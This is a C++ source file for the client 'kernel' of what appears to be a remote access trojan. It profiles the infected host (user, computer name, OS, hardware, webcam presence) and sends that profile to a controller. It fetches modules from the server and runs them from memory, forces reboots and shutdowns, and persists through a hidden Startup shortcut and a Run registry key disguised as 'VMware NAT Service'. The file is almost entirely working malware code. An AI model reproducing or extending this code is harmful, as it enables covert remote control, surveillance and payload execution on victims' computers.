#define STRSAFE_NO_DEPRECATE

#include "Kernel.h"
#include <time.h>
#include <dshow.h>
#include <WinInet.h>
#include <STDIO.H>
#include <process.h>
#include "utils.h"
#include  <shlobj.h>
#include "dbg.h"


#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Strmiids.lib") 

#define SERVICE_NAME TEXT("VMware NAT Service")


CKernel::CKernel(CClient*pClient) :
CEventHandler(pClient,KNEL)

{
	m_dwModuleSize = 0;
	m_dwLoadedSize = 0;
	m_ModuleBuffer = NULL;
	m_pendingTask = NULL;

	Release();
	m_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
}


CKernel::~CKernel()
{
	if (m_hEvent)
	{
		CloseHandle(m_hEvent);
		m_hEvent = NULL;
	}
}

/***********************************************************************
	由于CIOCPClient可以在断开连接后再一次尝试连接.
	所以在一个Handler的声明周期内,OnOpen和 OnClose可能多次调用..
	这一点是和构造函数和析构函数的区别..
	可以在构造函数和析构函数内准备好资源，在OnOpen的时候开始工作....,在on_close
	时候关闭一些正在工作的对象..
************************************************************************/

void CKernel::OnOpen()
{
}

void CKernel::OnClose()
{
	//
	Release();
	SetEvent(m_hEvent); 
}


void CKernel::Wait()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}


void CKernel::OnEvent(UINT32 e, BYTE* lpData, UINT Size)
{
	switch (e)
	{
	case KNEL_READY:
		OnReady();				//Send Login infomation;
		break;
	case KNEL_POWER_REBOOT:
		OnPower_Reboot();
		break;
	case KNEL_POWER_SHUTDOWN:
		OnPower_Shutdown();
		break;
	case KNEL_EDITCOMMENT:
		OnEditComment((TCHAR*)lpData);
		break;
	case KNEL_EXIT:
		OnExit();
		break;
	case KNEL_RESTART:
		OnRestart();
		break;
	//on run module

	//模块传输......
	case KNEL_MODULE_INFO:
		OnModuleInfo((BYTE*)lpData);
		break;
	case KNEL_MODULE_CHUNK_DAT:
		OnModuleData((BYTE*)lpData);
		break;

	case KNEL_RUN_MODULE:
		OnRunModule(lpData, Size);
		break;

	//On utils event.
	case KNEL_UTILS_COPYTOSTARTUP:
		OnUnilsCopyToStartupMenu();
		break;
	case KNEL_UTILS_WRITE_REG:
		OnUtilsWriteStartupReg();
		break;
	case KNEL_UTILS_OPEN_WEBPAGE:
		OnUtilsOpenWebPage((TCHAR*)lpData);
		break;
	}
}


void CKernel::GetModule(const TCHAR* ModuleName)
{
	//释放资源....
	lstrcpy(m_CurrentModule, ModuleName);
	m_dwLoadedSize = 0;
	m_dwModuleSize= 0;

	if (m_ModuleBuffer)
	{
		delete[] m_ModuleBuffer;
		m_ModuleBuffer = NULL;
	}
	//
	Send(KNEL_GETMODULE_INFO, ModuleName,sizeof(TCHAR) *( lstrlen(ModuleName) + 1));
}


void CKernel::OnModuleInfo(BYTE * info)
{
	DWORD   ModuleSize = ((DWORD*)info)[0];
	TCHAR * ModuleName = (TCHAR*)(info + sizeof(DWORD));
	
	if (!ModuleSize || lstrcmp(m_CurrentModule, ModuleName))
	{
		dbg_log("Invalid module");
		Release();
		return;
	}

	m_dwModuleSize   = ModuleSize;
	m_ModuleBuffer = new BYTE[m_dwModuleSize];

	GetModuleData();
}


void CKernel::OnModuleData(BYTE * lpData)
{
	DWORD *chunkInfo = (DWORD*)lpData;
	DWORD  moduleSize = chunkInfo[0];
	DWORD  chunkSize = chunkInfo[1];
	BYTE * chunkData = (BYTE*)&chunkInfo[2];

	if (moduleSize != m_dwModuleSize)
	{
		dbg_log("Invalid module");
		Release();
		return;
	}

	if (m_dwLoadedSize + chunkSize > moduleSize)
	{
		dbg_log("Invalid module");
		Release();
		return;
	}

	//Save Module Chunk Data.....
	memcpy(m_ModuleBuffer + m_dwLoadedSize, chunkData, chunkSize);

	m_dwLoadedSize += chunkSize;
	
	if (m_dwModuleSize != m_dwLoadedSize)
	{
		//continue to get module chunk...
		GetModuleData();
		return;
	}

	AddModule(m_ModuleBuffer, m_dwModuleSize);
	Release();
}


#define MAX_CHUNK_SIZE 0x10000

void CKernel::GetModuleData()
{
	DWORD LeftSize = m_dwModuleSize - m_dwLoadedSize;
	vec bufs[4];

	LeftSize = LeftSize < MAX_CHUNK_SIZE ? LeftSize : MAX_CHUNK_SIZE;

	bufs[0].lpData = &m_dwModuleSize;
	bufs[1].lpData = &m_dwLoadedSize;
	bufs[2].lpData = &LeftSize;

	bufs[0].Size = bufs[1].Size = bufs[2].Size = sizeof(DWORD);

	bufs[3].lpData = m_CurrentModule;
	bufs[3].Size = sizeof(TCHAR) * (lstrlen(m_CurrentModule) + 1);

	Send(KNEL_MODULE_CHUNK_GET, bufs, 4);
	// Total Size,checksum, offset,chunk size,
}
void CKernel::AddModule(const BYTE * lpData, UINT Size)
{
	//Load Module From Mem
	LPVOID      lpImageBase = NULL;
	ModuleEntry lpEntry     = NULL;
	Module *    module      = NULL;
	int err = (Size == 0);
	
	if (!err)
	{
		module = __LoadModule(lpData);
		if (!module)
		{
			err = -1;
		}
	}

	if (!err)
	{
		//load success.
		//Kernel 每一时刻只能有一个在Load,...
		err = -2;			//FULL
		for (int i = 0; i < MAX_MODULE_COUNT; i++)
		{
			SYSTEMTIME sys_time;
			GetLocalTime(&sys_time);

			if (m_LoadedModules[i].module_name[0])
				continue;

			m_LoadedModules[i].module = module;
			
			lstrcpy(m_LoadedModules[i].module_name, m_CurrentModule);

			wsprintf(
				m_LoadedModules[i].install_date,
				TEXT("%d-%02d-%02d %02d:%02d:%02d"),
				sys_time.wYear,
				sys_time.wMonth,
				sys_time.wDay,
				sys_time.wHour,
				sys_time.wMinute,
				sys_time.wSecond
				);

			//calc md5




			err = 0;
			break;
		}
	}


	if (m_pendingTask && !err)
	{
		ModuleInfo * module = FindLoadedModule(m_pendingTask->module_name);
		err = -3;

		if (module)
		{
			char ServerAddr[0x20] = { 0 };
			

			USHORT Port; 
			ModuleEntry entry;

			err = -4;

#ifdef UNICODE
			char module_entry[0x20] = { 0 };
			WideCharToMultiByte(
				CP_ACP,
				0,
				m_pendingTask->module_entry,
				lstrlen(m_pendingTask->module_entry),
				module_entry,
				0x1f,
				NULL, NULL);

			entry = (ModuleEntry)__GetProcAddress(
				(HMODULE)module->module->ImageBase,
				module_entry
				);
#else
			entry = (ModuleEntry)__GetProcAddress(
				(HMODULE)module->module->ImageBase,
				m_pendingTask->module_entry
				);

#endif
			if (entry)
			{
				err = 0;

				Port = GetPeerAddress(ServerAddr);

				entry(
					m_pClient->m_Iocp,
					module->module,
					ServerAddr,
					Port,
					(LPVOID*)(m_pendingTask->lpParams + 1),
					this,
					(typeRun)Run
					);
			}
		}
	}
	
	if (err)
	{
		TCHAR Error[0x100];
		wsprintf(Error, TEXT("AddModule failed with error : %d"), err);
		Send(KNEL_ERROR, Error, sizeof(TCHAR) * (lstrlen(Error) + 1));
	}

	if (m_pendingTask)
	{
		if (m_pendingTask->lpParams && 
			m_pendingTask->lpParams->release)
		{
			m_pendingTask->lpParams->release(m_pendingTask->lpParams);
		}

		delete m_pendingTask;
		m_pendingTask = NULL;
	}
}


/*******************************************************************************
			Get Ping
			********************************************************************************/
/*
	TTL: time to live,最长生存时间,每经过一个节点,TTL-1,到0的时候丢弃.;
	*/
/*
ping 请求:type 8,code 0;
ping 相应:type 0,code 0;
*/
//struct ip
//{
//	unsigned int hl : 4;		//header lenght;
//	unsigned int ver : 4;		//version;
//
//};

/*
检验和算法.;
两个字节为一个单位相加.;
若剩余一个字节,把最后一个字节加起来.;

若checksum 除去低16位之后不为0.右移16并且与低16位相加.;

返回~checksum;
*/

UINT16 CKernel::icmp_checksum(BYTE *buff, int len)
{
	UINT64 checksum = 0;
	UINT64 Hi = 0;
	if (len & 1)
		checksum += buff[len - 1];
	len--;
	for (int i = 0; i < len; i += 2){
		checksum += *(UINT16*)&buff[i];	//取两个字节相加.;
	}
	while ((Hi = (checksum >> 16)))
	{
		checksum = Hi + checksum & 0xFFFF;
	}
	return ~(USHORT)(checksum & 0xFFFF);
}


DWORD CKernel::GetPing(const char *host)
{
	struct MyIcmp
	{
		UINT8 m_type;
		UINT8 m_code;
		UINT16 m_checksum;			//校验和算法;
		UINT16 m_id;				//唯一标识;
		UINT16 m_seq;				//序列号;
		LARGE_INTEGER  m_TickCount;		//
	};

	DWORD			interval = -1;
	USHORT			id = LOWORD(GetProcessId(NULL));
	double			TickCountSum = 0;
	DWORD			SuccessCount = 0;
	LARGE_INTEGER	frequency;
	MyIcmp			icmp_data = { 0 };
	char			RecvBuf[128] = { 0 };
	sockaddr_in		dest = { 0 };
	int				i = 0;
	HOSTENT *		p = NULL;
	SOCKET			s;
	DWORD			timeout = 3000;

	QueryPerformanceFrequency(&frequency);

	s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	
	if (s == INVALID_SOCKET)
	{
		return interval;
	}

	//set recv time out;
	setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

	//获取目标主机IP;
	p = gethostbyname(host);
	if (!p)
		goto Return;

	memcpy(&dest.sin_addr, p->h_addr_list[0], 4);

	dest.sin_family = AF_INET;

	//设置icmp头;
	icmp_data.m_type = 8;
	icmp_data.m_code = 0;
	icmp_data.m_id = id;//唯一标识;

	for (i = 1; i <= 4; i++)
	{
		icmp_data.m_seq = i;	//序列;
		icmp_data.m_checksum = 0;

		QueryPerformanceCounter(&icmp_data.m_TickCount);
		icmp_data.m_checksum = icmp_checksum((BYTE*)&icmp_data, sizeof(icmp_data));
		//
		if (INVALID_SOCKET == sendto(
			s, 
			(char*)&icmp_data,
			sizeof(icmp_data),
			0, 
			(sockaddr*)&dest,
			sizeof(dest)))
		{
			goto Return;
		}

		int namelen = sizeof(dest);
		int nRecv = recvfrom(s, RecvBuf, 128, 0, (sockaddr*)&dest, &namelen);
		
		if (INVALID_SOCKET == nRecv && WSAETIMEDOUT != WSAGetLastError())
		{
			goto Return;
		}
		
		//接受到了.IP头的第一个字节,低四位是HeaderLen,高四位是版本.;
		if ((RecvBuf[0] & 0xf0) == 0x40)
		{
			//ipv4:
			DWORD IPHeaderLength = (RecvBuf[0] & 0x0f) * 4;
			char* RecvIcmpData   = RecvBuf + IPHeaderLength;

			if (((MyIcmp*)RecvIcmpData)->m_id == id && ((MyIcmp*)RecvIcmpData)->m_seq == i)
			{
				//计算间隔.GetTickCount精度有点低,将就一下。;
				LARGE_INTEGER cur_counter;

				QueryPerformanceCounter(&cur_counter);

				TickCountSum += ((double)cur_counter.QuadPart -
					((MyIcmp*)RecvIcmpData)->m_TickCount.QuadPart) / frequency.QuadPart * 1000;	//计算ms.
				
				SuccessCount++;
				interval = TickCountSum / SuccessCount + 1;
			}
		}
	}
Return:
	closesocket(s);
	return interval;
}

/*******************************************************************************
				GetPrivateIP
				********************************************************************************/
void CKernel::GetPrivateIP(TCHAR PrivateIP[128])
{
	SOCKADDR_IN addr = { 0 };
	int addrlen = sizeof(addr);
	char * lpszAddr = NULL;
	int    iAddrLength = 0;

	PrivateIP[0] = L'-';
	PrivateIP[1] = 0;

	m_pClient->GetSockName((SOCKADDR*)&addr, &addrlen);

	lpszAddr = inet_ntoa(addr.sin_addr);
	iAddrLength = lstrlenA(lpszAddr);
	
#ifdef UNICODE
	MultiByteToWideChar(CP_ACP, 0, lpszAddr, iAddrLength, PrivateIP, 127);
#else
	lstrcpyA(PrivateIP, lpszAddr);
#endif
}


/*******************************************************************************
				GetCPU
				********************************************************************************/
void CKernel::GetPCName(TCHAR PCName[128])
{
	DWORD BufferSize = 128;
	GetComputerName(PCName, &BufferSize);
}
void CKernel::GetCurrentUser(TCHAR User[128])
{
	DWORD BufferSize = 128;
	GetUserName(User, &BufferSize);
}

void CKernel::GetRAM(TCHAR RAMSize[128])
{
	MEMORYSTATUSEX MemoryStatu = { sizeof(MEMORYSTATUSEX) };
	LARGE_INTEGER liRAMSize = { 0 };

	if (GlobalMemoryStatusEx(&MemoryStatu))
	{
		liRAMSize.QuadPart = MemoryStatu.ullTotalPhys;
	}
	GetStorageSizeString(liRAMSize, RAMSize);
}

void CKernel::GetDisk(TCHAR szDiskSize[128])
{
	LARGE_INTEGER liDiskSize = { 0 };
	DWORD Drivers = GetLogicalDrives();
	TCHAR Name[] = TEXT("A:\\");

	while (Drivers)
	{
		if (Drivers & 0x1)
		{
			DWORD Type = GetDriveType(Name);

			if (DRIVE_FIXED == Type)
			{
				ULARGE_INTEGER TotalAvailableBytes;
				ULARGE_INTEGER TotalBytes;
				ULARGE_INTEGER TotalFreeBytes;
				GetDiskFreeSpaceEx(
					Name, 
					&TotalAvailableBytes, 
					&TotalBytes,
					&TotalFreeBytes);
				
				liDiskSize.QuadPart += TotalBytes.QuadPart;
			}
		}
		Name[0]++;
		Drivers >>= 1;
	}

	GetStorageSizeString(liDiskSize, szDiskSize);
}

void CKernel::GetOSName(TCHAR OsName[128])
{
	HKEY hKey = 0;
	DWORD dwType = REG_SZ;
	DWORD dwSize = 255;
	TCHAR data[MAX_PATH] = { 0 };
	OsName[0] = 0;

	if (!RegOpenKey(
		HKEY_LOCAL_MACHINE,
		TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
		&hKey))
	{
		if (!RegQueryValueEx(
			hKey, 
			TEXT("ProductName"), 
			NULL, 
			&dwType, 
			(LPBYTE)data, 
			&dwSize))
		{
			lstrcpy(OsName, data);
		}
		RegCloseKey(hKey);
	}

	DWORD bit = 32;
	SYSTEM_INFO si = { sizeof(si) };
	//GetSystemInfo获取子系统版本.

	typedef VOID(__stdcall *PGetNativeSystemInfo)(
		LPSYSTEM_INFO lpSystemInfo
		);

	HMODULE hKernel32 = GetModuleHandle(TEXT("Kernel32"));

	if (hKernel32)
	{
		PGetNativeSystemInfo GetNativeSystemInfo = (PGetNativeSystemInfo)GetProcAddress(hKernel32, "GetNativeSystemInfo");
	
		if (GetNativeSystemInfo){
			//printf("GetNativeSystemInfo: %x\n",GetNativeSystemInfo);
			GetNativeSystemInfo(&si);
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
				si.wProcessorArchitecture == PROCESSOR_AMD_X8664 ||
				si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64){
				bit = 64;
			}
			//printf("GetNativeSystemInfo OK !\n");
			TCHAR Bit[16] = { 0 };
			wsprintf(Bit, TEXT(" %d Bit"), bit);
			lstrcat(OsName, Bit);
		}
	}
}


void CKernel::GetCPU(TCHAR CPU[128])
{
	//0x80000002-->0x80000004
	SYSTEM_INFO si = { 0 };
	HKEY  hKey = NULL;
	DWORD dwMHZ = 0;
	DWORD Type = REG_DWORD;
	DWORD cbBuffer = sizeof(dwMHZ);

	CHAR  szName[64] = { 0 };
	TCHAR subKey[] = TEXT("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");

	__asm
	{
		xor esi, esi
		mov edi, 0x80000002
	getinfo:
		mov eax, edi
		add eax, esi
		cpuid
		shl esi, 4
		mov dword ptr[szName + esi + 0], eax
		mov dword ptr[szName + esi + 4], ebx
		mov dword ptr[szName + esi + 8], ecx
		mov dword ptr[szName + esi + 12], edx
		shr esi, 4
		inc esi
		cmp esi, 3
		jb getinfo

		mov ecx, 0
		mov edi, [CPU]
	copyinfo:
		mov al, byte ptr[szName + ecx]
		movzx ax,al
		mov word ptr [edi + ecx * 2], ax
		inc ecx
		test ax, ax
		jne copyinfo
	}

	
	if (ERROR_SUCCESS != RegCreateKey(
		HKEY_LOCAL_MACHINE,
		subKey, &hKey))
	{
		return;
	}

	if (ERROR_SUCCESS == RegQueryValueEx(
		hKey, 
		TEXT("~MHz"),
		0, 
		&Type, 
		(LPBYTE)&dwMHZ, 
		&cbBuffer))
	{
		GetSystemInfo(&si);
		wsprintf(CPU, TEXT("%d MHz * %d"), dwMHZ, si.dwNumberOfProcessors);
	}
	RegCloseKey(hKey);
}

DWORD CKernel::HasCamera()
{
	UINT nCam = 0;
	CoInitialize(NULL);     
	ICreateDevEnum *pCreateDevEnum;                          
	HRESULT hr = CoCreateInstance(
		CLSID_SystemDeviceEnum,     
		NULL,                                                 
		CLSCTX_INPROC_SERVER,                                 
		IID_ICreateDevEnum,                                   
		(void**)&pCreateDevEnum);                            

	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}

	IEnumMoniker *pEm;            
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR){
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                           
	ULONG cFetched;
	IMoniker *pM;                                            
	while (hr = pEm->Next(1, &pM, &cFetched), hr == S_OK)       
	{
		IPropertyBag *pBag;                                  
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		if (SUCCEEDED(hr))
		{
			VARIANT var;
			var.vt = VT_BSTR;                                
			hr = pBag->Read(L"FriendlyName", &var, NULL);
 
			if (hr == NOERROR){
				nCam++;
				SysFreeString(var.bstrVal);    
			}
			pBag->Release();                   
		}
		pM->Release();                        
	}
	CoUninitialize();                    
	return nCam;
}

void CKernel::GetInstallDate(TCHAR InstallDate[128])
{
	HKEY hKey = NULL;
	DWORD cbBuffer = 128 * sizeof(TCHAR);
	DWORD Type = 0;

	//Open Key
	if (ERROR_SUCCESS != 
		RegCreateKey(
		HKEY_CURRENT_USER,
		TEXT("SOFTWARE\\HHClient"), 
		&hKey))
	{
		lstrcpy(InstallDate, TEXT("-"));
		return;
	}

	
	if (ERROR_SUCCESS != RegQueryValueEx(hKey,
		TEXT("InstallDate"), 
		0, 
		&Type, 
		(LPBYTE)InstallDate,
		&cbBuffer))
	{
		//Set key value;
		//失败.....
		SYSTEMTIME st = { 0 };
		TCHAR CurDate[64] = { 'U', 'n', 'k', 'n', 'o', 'w', 'n', '\0' };
		GetLocalTime(&st);

		wsprintf(CurDate, TEXT("%d-%d-%d %d:%d:%d"),
			st.wYear,
			st.wMonth, 
			st.wDay,
			st.wHour,
			st.wMinute,
			st.wSecond);
		
		//
		if (ERROR_SUCCESS != RegSetValueEx(
			hKey, 
			TEXT("InstallDate"), 
			0,
			REG_SZ, 
			(BYTE*)CurDate,
			sizeof(TCHAR)*(lstrlen(CurDate) + 1)))
		{
			//设置失败....返回...
			lstrcpy(InstallDate, TEXT("-"));
			RegCloseKey(hKey);
			return;
		}
		//设置成功，返回设置的InstallDate....
		lstrcpy(InstallDate, CurDate);
	}
	RegCloseKey(hKey);
	return;
}

void CKernel::GetComment(TCHAR Comment[256])
{
	HKEY hKey = NULL;

	lstrcpy(Comment, TEXT("default"));
	
	//Open Key
	if (ERROR_SUCCESS == RegCreateKey(
		HKEY_CURRENT_USER,
		TEXT("SOFTWARE\\HHClient"), 
		&hKey))
	{
		DWORD cbBuffer = 256;
		DWORD Type = 0;
		if (ERROR_SUCCESS == RegQueryValueEx(
			hKey, 
			TEXT("Comment"), 
			0, 
			&Type, 
			(LPBYTE)Comment, 
			&cbBuffer))
		{
			//do nothing.....
		}
		RegCloseKey(hKey);
	}
	return;
}

void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
{
	char peer_ip[0x20];
	SOCKADDR_IN addr;
	int addrlen = sizeof(addr);

	memset(pLoginInfo, 0, sizeof(LoginInfo));
	
	GetPrivateIP(pLoginInfo->PrivateIP);
	GetPCName(pLoginInfo->HostName);
	GetCurrentUser(pLoginInfo->User);
	GetOSName(pLoginInfo->OsName);
	GetInstallDate(pLoginInfo->InstallDate);
	GetCPU(pLoginInfo->CPU);
	GetDisk(pLoginInfo->Disk_RAM);
	lstrcat(pLoginInfo->Disk_RAM, TEXT("/"));
	GetRAM(pLoginInfo->Disk_RAM + lstrlen(pLoginInfo->Disk_RAM));
	GetComment(pLoginInfo->Comment);

	m_pClient->GetPeerName((SOCKADDR*)&addr,&addrlen);
	lstrcpyA(peer_ip, inet_ntoa(addr.sin_addr));

	pLoginInfo->dwPing = GetPing(peer_ip);
	pLoginInfo->dwHasCamera = HasCamera();
}

void CKernel::OnPower_Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//获取进程标志
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	//获取关机特权的LUID
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//获取这个进程的关机特权
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS)
		return;

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}
void CKernel::OnPower_Shutdown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//获取进程标志
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	//获取关机特权的LUID
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//获取这个进程的关机特权
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS)
		return;

	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
}

void CKernel::OnReady()
{
	LoginInfo li;
	GetLoginInfo(&li);
	Send(KNEL_LOGIN, (char*)&li, sizeof(li));
}

void CKernel::OnEditComment(TCHAR NewComment[256])
{
	HKEY hKey = NULL;
	TCHAR error[0x100];
	//Open Key
	if (ERROR_SUCCESS == RegCreateKey(
		HKEY_CURRENT_USER, 
		TEXT("SOFTWARE\\HHClient"),
		&hKey))
	{
		DWORD dwError = RegSetValueEx(
			hKey, 
			TEXT("Comment"),
			0,
			REG_SZ, 
			(BYTE*)NewComment, 
			sizeof(TCHAR)*(lstrlen(NewComment) + 1));

		if (ERROR_SUCCESS == dwError)
		{
			Send(KNEL_EDITCOMMENT_OK, 
				NewComment,
				sizeof(TCHAR)*(lstrlen(NewComment) + 1));
		}
		else
		{
			wsprintf(error, TEXT("RegSetValueEx failed with error: %d"), dwError);
			Send(KNEL_ERROR, error, sizeof(TCHAR) * (lstrlen(error) + 1));
		}
		RegCloseKey(hKey);
		return;
	}
	return;
}

void CKernel::OnExit()
{
	dbg_log("Kernel Exit");
	ExitProcess(0);
}

void CKernel::OnRestart()
{
	PROCESS_INFORMATION pi;
	STARTUPINFOA		si = { sizeof(si) };
	
	char szModuleName[0x1000];
	//exec another instance.
	GetModuleFileNameA(GetModuleHandle(0), szModuleName, 0x1000);
	//
	if (CreateProcessA(szModuleName, 0, 0, 0, 0, 0, 0, 0, &si, &pi))
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		ExitProcess(0);
	}
}

void CKernel::OnUnilsCopyToStartupMenu()
{

	TCHAR          StartupPath[MAX_PATH];
	TCHAR          szError[0x100];
	TCHAR		   exePath[MAX_PATH];
	TCHAR		   workDir[MAX_PATH];
	HRESULT		   hres;
	IShellLink *   pShellLink;
	IPersistFile * pPersistFile;

	if (!SHGetSpecialFolderPath(NULL, StartupPath, CSIDL_STARTUP, FALSE))
	{
		wsprintf(szError, TEXT("SHGetSpecialFolderPath Failed With Error : %u"), GetLastError());
		Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	lstrcat(StartupPath, TEXT("\\"));
	lstrcat(StartupPath, SERVICE_NAME);
	lstrcat(StartupPath, TEXT(".lnk"));

	
	hres = ::CoCreateInstance(
		CLSID_ShellLink,
		NULL, 
		CLSCTX_INPROC_SERVER,
		IID_IShellLink,
		(void **)&pShellLink);

	if (!SUCCEEDED(hres))
	{
		wsprintf(szError, TEXT("CoCreateInstance Failed With Error : %u"), GetLastError());
		Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	
	GetCurrentDirectory(MAX_PATH, workDir);
	GetModuleFileName(GetModuleHandleA(0), exePath, MAX_PATH);

	pShellLink->SetPath(exePath);
	pShellLink->SetWorkingDirectory(workDir);

	hres = pShellLink->QueryInterface(IID_IPersistFile, (void **)&pPersistFile);
	
	if (SUCCEEDED(hres))
	{
		hres = pPersistFile->Save(StartupPath, TRUE);

		if (SUCCEEDED(hres))
		{	
			wsprintf(szError, TEXT("Copy To Startup Menu Success!"));
			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));

			SetFileAttributesW(
				StartupPath, 
				FILE_ATTRIBUTE_SYSTEM |
				FILE_ATTRIBUTE_HIDDEN);
		}
		else
		{
			wsprintf(szError,  TEXT("Copy To Startup Menu Failed (%d)!"), hres);
			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		}
		pPersistFile->Release();
	}
	pShellLink->Release();
}

void CKernel::OnUtilsWriteStartupReg()
{
	TCHAR  exePath[MAX_PATH];
	HKEY  hKey = NULL;
	TCHAR keyPath[] = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	TCHAR szError[0x100];

	GetModuleFileName(GetModuleHandle(0), exePath, MAX_PATH);

	//Open Key
	//HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	if (ERROR_SUCCESS == RegCreateKey(HKEY_CURRENT_USER, keyPath, &hKey))
	{
		DWORD dwError = RegSetValueEx(
			hKey, 
			SERVICE_NAME,
			0,
			REG_SZ,
			(BYTE*)exePath, 
			sizeof(TCHAR)* (lstrlen(exePath) + 1)
		);

		if (dwError)
		{
			wsprintf(szError, TEXT("RegSetValueEx Failed With Error: %u"), dwError);
		}
		else
		{
			wsprintf(szError, TEXT("Write Registry Start Success!"), dwError);
		}
		RegCloseKey(hKey);
	}
	else
	{
		wsprintf(szError, TEXT("RegCreateKey Failed With Error: %u"), GetLastError());
	}
	Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
}

void CKernel::OnUtilsOpenWebPage(TCHAR* szUrl)
{
	ShellExecute(NULL, TEXT("open"), szUrl, NULL, NULL, SW_SHOW);
}


//typedef void(*ModuleEntry)(CIOCP *Iocp ,char* szServerAddr, unsigned short uPort, LPVOID lpParam);


int CKernel::Run(CKernel * kernel, const TCHAR * module_name, const TCHAR* module_entry, Params* lpParams)
{
	ModuleInfo * module = kernel->FindLoadedModule(module_name);
	CHAR ServerIP[0x20];
	USHORT Port;
	ModuleEntry entry;
	TCHAR szError[0x100]; 
	LPVOID* ArgList = NULL;
	int ret;

	if (!module)
	{
		if (!kernel->TryAcquire())
		{
			wsprintf(szError, TEXT("Kernel is busy..."));
			kernel->Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
			return -1;
		}

		//
		kernel->m_pendingTask = (PendingTask*)calloc(1,sizeof(PendingTask));
		kernel->m_pendingTask->lpParams = lpParams;
		lstrcpy(kernel->m_pendingTask->module_name, module_name);
		lstrcpy(kernel->m_pendingTask->module_entry, module_entry);

		kernel->GetModule(module_name);
		return -2;
	}

	//exec module if it has been installed.
	Port = kernel->GetPeerAddress(ServerIP);

#ifdef UNICODE
	CHAR module_entry_a[64] = { 0 };
	WideCharToMultiByte(
		CP_ACP, 
		0, 
		module_entry, 
		lstrlen(module_entry),
		module_entry_a,
		63,
		NULL,
		NULL);
		
	entry = (ModuleEntry)__GetProcAddress(
		(HMODULE)module->module->ImageBase,
		module_entry_a
		);
#else
	entry = (ModuleEntry)__GetProcAddress(
		(HMODULE)module->module->ImageBase,
		module_entry
		);
#endif
	
	if (lpParams)
	{
		ArgList = (LPVOID*)(lpParams + 1);
	}
	
	ret = entry(
		kernel->m_pClient->m_Iocp,
		module->module,
		ServerIP,
		Port,
		ArgList,
		kernel,
		(typeRun)Run

		);

	if (ret)
	{
		wsprintf(szError,TEXT("Run module %s failed with %d"), module_name, ret);
		kernel->Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}

	if (lpParams)
		lpParams->release(lpParams);
	return 0;
}


void CKernel::OnRunModule(BYTE * lpData, UINT32  Size)
{
	TCHAR * module_name  = (TCHAR*)lpData;
	TCHAR * module_entry = (TCHAR*)(module_name + lstrlen(module_name) + 1);
	BYTE *  params       = (BYTE*)(module_entry + lstrlen(module_entry) + 1);
	int     params_size  = Size - (params - lpData);
	Params * lpParams    = NULL;

	TCHAR szError[0x100];
	
	if (params_size < 0){
		wsprintf(szError, TEXT("Invaliid module info"));
		Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	if (params_size > 0)
	{
		lpParams = deserialize_kernel_params(params, params_size);

		if (lpParams == NULL)
		{
			wsprintf(szError, TEXT("deserialize_kernel_params failed"));
			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
			return;
		}
	}
	
	//
	Run(this, module_name, module_entry, lpParams);
}